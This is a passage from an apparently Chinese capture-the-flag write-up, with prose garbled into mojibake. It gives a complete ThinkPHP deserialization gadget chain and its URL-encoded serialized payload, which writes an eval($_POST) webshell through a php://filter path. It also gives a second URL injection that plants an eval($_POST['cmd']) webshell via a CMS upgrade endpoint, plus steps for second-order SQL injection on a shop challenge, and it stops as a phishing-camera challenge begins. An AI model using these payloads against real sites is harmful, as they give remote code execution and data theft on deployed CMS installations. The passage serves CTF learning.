&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>&lt;span style="color:#75715e">// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\db&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Query&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;model=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Output&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$styles&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">styles&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;getAttr&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\session\driver\Memcached
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\session\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcached&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handler&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\cache\driver\File
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\cache\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">File&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$tag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;expire&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3600&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;cache_subdir&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;prefix&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;data_compress&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$Memcached&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\session\driver\Memcached&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\think\cache\driver\File&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$Output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\console\Output&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Memcached&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\db\Query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$HasOne&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\relation\HasOne&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$window&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\process\pipes\Windows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\Pivot&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$HasOne&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$window&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šä¼ &lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
&lt;/code>&lt;/pre>&lt;p>è™½ç„¶ä¼šè¿”å›ä¸€ä¸ªæŠ¥é”™çš„é¡µé¢ï¼Œä½†æ˜¯å¯ä»¥åœ¨&lt;code>/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php&lt;/code>å¤„éªŒè¯ä¸€ä¸‹æ˜¯å¦å†™ä¸Šäº†ğŸï¼Œæ–‡ä»¶åå­—æ˜¯&lt;code>md5('tag_'.md5($this-&amp;gt;tag))&lt;/code>ï¼Œè¿æ¥å¯†ç æ˜¯ccc ç›´æ¥èšå‰‘&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804202819779.png" alt="image-20210804202819779">&lt;/p>
&lt;p>åœ¨&lt;a href="http://www.snowywar.top/?p=2424">é›ªæ®‡çš„wp&lt;/a>ä¸­ç”¨çš„æ˜¯å¦ä¸€ä¸ªï¼Œæ›´ç›´æ¥çš„å†™ğŸæ–¹å¼ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯ï¼ˆå¤§æ¦‚&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥å…ˆå°è¯•çœ‹çœ‹æ•æ„Ÿå‡½æ•°file_put_contents()æ˜¯å¦èƒ½åˆ©ç”¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212231467.png" alt="image-20210804212231467">&lt;/p>
&lt;p>åœ¨&lt;code>application/admin/controller/Upgrade.php&lt;/code>ä¸‹çœ‹åˆ°äº†æ–‡ä»¶å†™å…¥çš„å‡½æ•°ï¼Œå®ƒä½äºåœ¨&lt;code>writelog()&lt;/code>ä¸­ï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯å¤„ç†postè¯·æ±‚ä¼ å…¥çš„å„é¡¹å‚æ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212743633.png" alt="image-20210804212743633">&lt;/p>
&lt;p>è¿™ä¸ª&lt;code>config('client_upgrade_edition')&lt;/code>æï¼Œè·Ÿäº†ä¸€ä¸‹ å®ƒä¼šè¿”å›nullï¼Œå†å¾€ä¸Šçœ‹åˆ°&lt;code>_initialize()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805140607537.png" alt="image-20210805140607537">&lt;/p>
&lt;p>æ‰€ä»¥æœ€åæ˜¯ä¼šå°†$upgrade_editionå†™å…¥ä¸­&lt;code>/runtime/client_upgrade_edtion.php&lt;/code>ä¸­ï¼›è€Œæ•´ä¸ªwritelog()å‡½æ•°ä¼šè¢«sysup()è°ƒç”¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804213858768.png" alt="image-20210804213858768">&lt;/p>
&lt;p>è·Ÿè¿›è¿™ä¸ªsysup()å’Œ$upgrade_edtionï¼Œçœ‹æ˜¯å¦å¯ç”¨+å¦‚ä½•ç”¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220616726.png" alt="image-20210804220616726">&lt;/p>
&lt;p>åœ¨&lt;code>template/admin_style/default/admin/upgrade/index.htm&lt;/code>ä¸‹çœ‹åˆ°äº†ç¡®å®å­˜åœ¨çš„è·¯ç”±ï¼Œè¿™ä¸ªçš„é¡µé¢æ˜¯åœ¨åå°ç®¡ç†ä¸­å¿ƒ - ç³»ç»ŸåŠŸèƒ½ - ç³»ç»Ÿåœ¨çº¿å‡çº§å¤„ï¼Œéšä¾¿å‡ä¸€ä¸ªçœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804214721944.png" alt="image-20210804214721944">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804215658734.png" alt="image-20210804215658734">&lt;/p>
&lt;p>æŠ“åŒ…ä¹‹åçœ‹åˆ°è¿™é‡Œç¡®å®æœ‰postè®¿é—®å’Œupgrade_edtionå‚æ•°ï¼Œé‚£å°±ç¨³äº†ï¼Œç›´æ¥å†™ğŸ&lt;/p>
&lt;pre tabindex="0">&lt;code>/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220302331.png" alt="image-20210804220302331">&lt;/p>
&lt;p>å°†ğŸå†™è¿›çš„ç›®æ ‡é¡µé¢&lt;code>/runtime/client_upgrade_edition.php&lt;/code>è¿å…¥èšå‰‘ æ‹¿flagå³å¯&lt;/p>
&lt;p>â€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™æˆ‘å…¶å®æ˜¯æ²¡æœ‰æœåˆ°&lt;a href="https://ma4ter.cn/2527.html">é½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡&lt;/a>è¿™ç¯‡çš„ï¼Œå½“æ—¶æ€è·¯æ˜¯åœ¨åå°åœ¨æ‰¾æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ç›´æ¥å†™ğŸ ï¼Œå½“æ—¶æ‰¾çš„æ˜¯ç‹¬ç«‹é¡µç®¡ç†ï¼Œå°è¯•uploadï¼Œä½†æ˜¯å¹¶ä¸å¤ªè¡Œï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼‰ï¼Œç„¶åä¹Ÿæ²¡å»å®¡ä»£ç ï¼ˆæ‡’ç‹—ï¼‰æ‰€ä»¥ å°±æ²¡å‡ºè¿™ä¸ªé¢˜ï¼Œç°åœ¨çœ‹è¿˜æ˜¯ç–å¿½äº† ç¡®å®å®Œå…¨æ²¡æ³¨æ„åˆ°ç³»ç»Ÿåœ¨çº¿å‡çº§è¿™ä¸ªæ¨¡å—æ˜¯å¯ç”¨çš„ ä¹Ÿæ²¡æœ‰è®¤çœŸçš„åˆ†ææºç  æˆ‘çš„è¿‡&lt;/p>
&lt;h2 id="å®‰å…¨å®‰å…¨è¿˜æ˜¯xxxçš„å®‰å…¨">å®‰å…¨,å®‰å…¨,è¿˜æ˜¯xxxçš„å®‰å…¨&lt;/h2>
&lt;blockquote>
&lt;p>æŸä¸ªç‰¹åˆ«å®‰å…¨çš„å•†åº—&lt;/p>
&lt;p>Hint:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;users&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span> &lt;span style="color:#00a8c8">NOT&lt;/span> &lt;span style="color:#00a8c8">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span> &lt;span style="color:#00a8c8">UNIQUE&lt;/span> &lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;login_password&amp;#34;&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;money&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;pay_password&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flag_num&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#00a8c8">PRIMARY&lt;/span> &lt;span style="color:#00a8c8">KEY&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;flaaaaaaaaag&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flllllllag&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>ç‰¹åˆ«ç®€é™‹çš„å‰ç«¯ï¼Œæœ‰ç™»å½•å’Œæ³¨å†Œå’Œä¸»é¡µä¸‰ä¸ªé¡µé¢ï¼Œç™»å½•å¤„æœ‰ä¸€å®šè¿‡æ»¤ å­˜åœ¨sqli&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133701306.png" alt="image-20210801133701306">&lt;/p>
&lt;p>ä»»æ„æ³¨å†Œè´¦å·ï¼Œèµ°ä¸€æ³¢æµç¨‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133748445.png" alt="image-20210801133748445">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133808970.png" alt="image-20210801133808970">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133825487.png" alt="image-20210801133825487">&lt;/p>
&lt;p>&lt;del>ğŸ˜…èšŒåŸ ä½äº†&lt;/del>&lt;/p>
&lt;p>å›è¿‡å¤´æ¥çœ‹ä¸€ä¸‹Burpå¯¹åˆšæ‰æ“ä½œçš„æŠ“åŒ…ç»“æœï¼Œä»cookieå¯ä»¥çŸ¥é“åç«¯æ˜¯flaskæ¡†æ¶ ï¼Œflaskçš„è¯ä¸€èˆ¬æ ‡é…sqliteæ•°æ®åº“ï¼Œç„¶åçœ‹ä¸‹é¡µé¢æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805142343684.png" alt="image-20210805142343684">&lt;/p>
&lt;p>æ³¨å†Œæ—¶ç”¨postæäº¤ä¿¡æ¯ï¼Œå¯†ç éƒ¨åˆ†ç”¨çš„æ˜¯&lt;code>md5(app.users.password+'CBCTF')&lt;/code>ï¼Œæ”¯ä»˜å¯†ç æ˜¯&lt;code>encrsa(app.users.pay_password)&lt;/code>ï¼Œå¥½å®¶ä¼™ è¿™ä¸ªåŠ å¯† pay_passwordéƒ¨åˆ†md5+rsa+b64&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>â€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™åŸºæœ¬å°±åœåˆ°è¿™é‡Œäº†ï¼Œæ„Ÿè§‰æ˜¯sqli ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ³¨ å…¨æ˜¯md5çš„ï¼Œä»¥ä¸‹æ˜¯å‚è€ƒ&lt;a href="https://www.cnblogs.com/erR0Ratao/p/15088223.html">wp&lt;/a>ä¹‹åçš„å¤ç°&lt;/p>
&lt;p>èµ›åè®²é¢˜çš„æ—¶å€™ å‡ºé¢˜å¸ˆå‚…è¯´å‚è€ƒçš„æ˜¯è¿™ä¸€ç¯‡æ–‡ç« &lt;a href="http://cache.baiducontent.com/c?m=DKJpowjfS-VrxBDrvlkdWFgbk_gnjyP0HEBWJljdQEQ9V3LlYgD1_bfav9DjmFclDejSpHzx5A9kyWFfTVUYm0bX6pNmtyBsxwPjYx-C3KRb_L2YzCoKogiCFXWcyV80EQ5dcXMLFlkbGHr_-te4xQbrgVm2Sd2UKx-_aXSrxQZ-IEBexIZkQCHg53QbTNdTQkH1IHgj_ozoB9uq12JYdR54wSPrMDwCK9QMq-qhRNa&amp;amp;p=8734d15e8cd012a05abd9b7d0c1093&amp;amp;newp=8478c915d9c040a911a2c7710f0588231610db2151d6d1126b82c825d7331b001c3bbfb423291b07d6c27a6c01aa485ae9f23073330923a3dda5c91d9fb4c57479c168&amp;amp;s=cfcd208495d565ef&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=%CA%FD%BE%DD%BC%D3%C3%DC%BB%F2%B3%C9WAF%CA%A7%D0%A7%D7%EE%B4%F3%D4%AA%D0%D7&amp;amp;qid=e0c153e70004188f&amp;amp;p1=1">æ•°æ®åŠ å¯†æˆ–æˆWAFå¤±æ•ˆæœ€å¤§å…ƒå‡¶â€¦&lt;/a>ï¼ˆåŸå¸–è¢«404äº† åªæœ‰ä¸ªå¿«ç…§ è¿˜æ˜¯ç™¾åº¦å¿«ç…§æ‰èƒ½çœ‹ è€Œä¸”æ²¡å›¾ï¼‰æ ¸å¿ƒæ˜¯è¿™ä¸€æ®µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805151726564.png" alt="image-20210805151726564">&lt;/p>
&lt;p>è¿™ä¸ªé¢˜çš„flagè´­ä¹°å°ç«™ï¼Œå¯¹pay_passwordæ˜¯è¿›è¡Œå‰ç«¯md5+rsa+b64åŠ å¯†ï¼Œåç«¯å†å¯¹åº”ç€æ‹¿ç§é’¥è§£å¯†ï¼Œå­˜å…¥æ•°æ®åº“çš„æ˜¯md5å€¼ï¼Œçœ‹ä¼¼å¾ˆå®Œç¾ ä½†æ˜¯å…¶å®æ ¹æœ¬æ²¡æœ‰wafçš„ä»‹å…¥ æ²¡æœ‰å¯¹å‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå¦‚æœæˆ‘ä»¬ä»ä¸­é—´ä»‹å…¥ åªä¿ç•™rsa+b64çš„éƒ¨åˆ† å°±å¯ä»¥ä»»æ„æ§åˆ¶å‚æ•°è¾¾åˆ°äºŒæ¬¡æ³¨å…¥çš„æ•ˆæœ&lt;/p>
&lt;p>å…¬é’¥åœ¨ç½‘é¡µæºç ä¸­å·²ç»ç»™å‡ºï¼Œæ•°æ®è¡¨çš„ç»“æœä¹Ÿå·²ç»åœ¨Hintä¸­äº†ï¼Œç”¨cyberchefä¸€æŠŠæ¢­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805153732476.png" alt="image-20210805153732476">&lt;/p>
&lt;p>é‡æ–°æ³¨å†Œä¸ªè´¦å·ï¼Œåªä¿®æ”¹ä¸€ä¸‹usernameå³å¯ passwdä¸ç”¨å˜ å°†pay_passwordä¿®æ”¹ä¸ºä¸Šé¢ç”Ÿæˆçš„å€¼ï¼Œç™»é™†åå³å¯çœ‹åˆ°flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805152706585.png" alt="image-20210805152706585">&lt;/p>
&lt;h2 id="jjs-camera">jj&amp;rsquo;s camera&lt;/h2>
&lt;blockquote>
&lt;p>jjåœ¨æŸæ¬¡ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¸­å‘ç°äº†ä¸ªé»‘å®¢åšçš„ç½‘ç«™ï¼Œè¯·ä½¿ç”¨httpsè®¿é—®ç«™ç‚¹&lt;/p>
&lt;p>Hint: ç½‘ä¸Šèƒ½æœåˆ°æºç ï¼Œä»…ä¿®æ”¹äº†å‰ç«¯uiï¼Œæ³¨æ„æœåŠ¡å™¨çš„å“åº”&lt;/p>
&lt;/blockquote>
&lt;p>ä¹Ÿæ˜¯å·²æœ‰çš„ä¸œè¥¿ ä½†æ˜¯æ¯”èµ›çš„æ—¶å€™æˆ‘æ²¡æœåˆ°æºç ï¼ˆå°´å°¬ï¼‰æºç åœ¨è¿™é‡Œï¼š&lt;a href="https://www.heibai.org/post/2002.html">åœ¨å—å®è´ï¼Ÿä½ ç‚¹å¼€è¿™ä¸ªç½‘å€çœ‹çœ‹[æ‰“å¼€ç½‘ç«™å·æ‹ç…§ç‰‡]&lt;/a> | &lt;a href="https://www.heibai.org/post/1630.html">ç‚¹å¼€ä¸€ä¸ªç½‘å€æˆ‘è¢«è®°å½•äº†ipè¿˜å·æ‹äº†ç…§ç‰‡&lt;/a>&lt;/p>
&lt;p>ï¼ˆæˆ‘è¿™ä¸ªæ™ºå•†çœŸçš„æ˜¯è´Ÿæ•°èµ·æ­¥çš„ ä¸Šé¢è¿™ä¸¤ä¸ªå¸–å­æˆ‘çœ‹äº†å¥½ä¹… æ‰ååº”è¿‡æ¥è¿™ä¸ªé’“é±¼ç½‘ç«™æ˜¯è¦å¹²å•¥ã€‚ã€‚ã€‚ã€‚&lt;/p>
